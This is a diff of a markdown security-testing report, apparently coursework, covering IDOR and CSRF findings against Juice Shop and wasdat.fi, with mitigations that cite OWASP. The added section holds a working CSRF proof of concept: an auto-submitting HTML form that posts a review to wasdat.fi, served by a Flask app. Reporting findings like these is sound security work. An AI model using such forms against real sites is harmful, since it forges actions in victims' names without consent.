@@ -4,7 +4,7 @@
 
 ### Authorization Bypass:
 
-#### Wasdat - View Basket
+#### JuiceShop - View Basket
 
 **Title:** Unauthorized user can view other users baskets.
 
@@ -31,7 +31,7 @@
 
 ---
 
-#### Main Target - Wasdat.fi
+#### Main target - Order history is vulnerable to Indirect Object Reference
 
 **Title:** Unauthorized user can view other users order history and access address information.
 
@@ -58,11 +58,13 @@
 
 ---
 
-#### Main Target - Wasdat.fi
+### Cross Site Forgery
+
+#### Juice Shop - Cross-Site Request Forgery (2 point) :
 
 **Title:** Cross Site Forgery - Change victim username 
 
-**Description:** Web Application allows cross site request and is vulnerable for forged websites to send http requests to application. This allows malicious websites execute `http` request towards the website.
+**Description:** Web Application allows cross site request and is vulnerable for forged websites to send http requests to application. This allows malicious websites execute `http:POST/`  request towards the website and change other users usernames.
 
 **Steps to produce:**  
 
@@ -109,11 +111,74 @@ if __name__ == '__main__':
 
 
 * Impact estimation:
-    * Low Severity. User can make harm for other users such as add or remove items but can't access any
+    * Low Severity. User can make harm for other users by changing their usernames.
 * Mitigation:
-    * Modify settings endpoint to check for authentication&authorization properly
-        * See: https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html (good: it's good to be able to provide a link or links that provide more information and guidance)
-        * See: https://imaginary-web-framework-targetapp-is-made-with.com/docs/best-practices/authorization (excellent: if you are able, it's great to refer to guidance that is most relevant to target application)
-
+    * Require http headers not to allow requests from from other origins.
+        * See: ![Cross-Site Request Forgery preventation](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers)
 ---
+
+#### Main Target - Review product feature is vulnerable for CSRF attack
+
+**Title:** Cross Site Forgery - Review product feature is vulnerable.
+
+**Description:** Web Application has vulnerability in Review product feature. This vulnerability allows malicious website to send product reviews under other users name. In addition even though not exploited in this implementation, there is following vulnerabilities: 
+    * csfr tokens are not hidden
+    * cookies are not set to expire after session
+    * double token validation is not implemented
+
+**Steps to produce:**  
+
+1. Create a new `html` file.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wasdat Redirect</title>
+    <script>
+        window.onload = function() {
+            document.getElementById("autoSubmitForm").submit();
+        }
+    </script>
+</head>
+<body>
+        <form action="http://wasdat.fi/product/2" method="post" id="autoSubmitForm">
+                <input name="review" value="ab0197"/>
+                <input type="submit"/>
+        </form>
+</body>
+</html>
+```
+2. Create a simple python server:
+
+```py
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('form.html')
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+3. Start sever `python3 app.py`
+4. Victim user is logged in to `http://wasdat.fi/` and goes to your url, in this case: `http://127.0.0.1:5000/`. This makes automatic `http /post` request to `http://wasdat.fi/product/2` creating a new product review with value: `ab0197`. This new review is not visible to user untill he visits the page next time.
+
+![image](../images/was4.png)
+![image](../images/was5.png)
+
+
+* Impact estimation:
+    * Low Severity. Malicious website can make harm for other users by posting product reviews under other users usernames.
+* Mitigation:
+    * Require http headers not to allow requests from from other origins.
+    * csfr tokens and session id's should not be visible to users.
+        * See: ![Token based mitigation](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation)
+    * Require `http headers` not to allow requests from from other origins.
+        * See: ![Cross-Site Request Forgery preventation](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers)
+
+
 
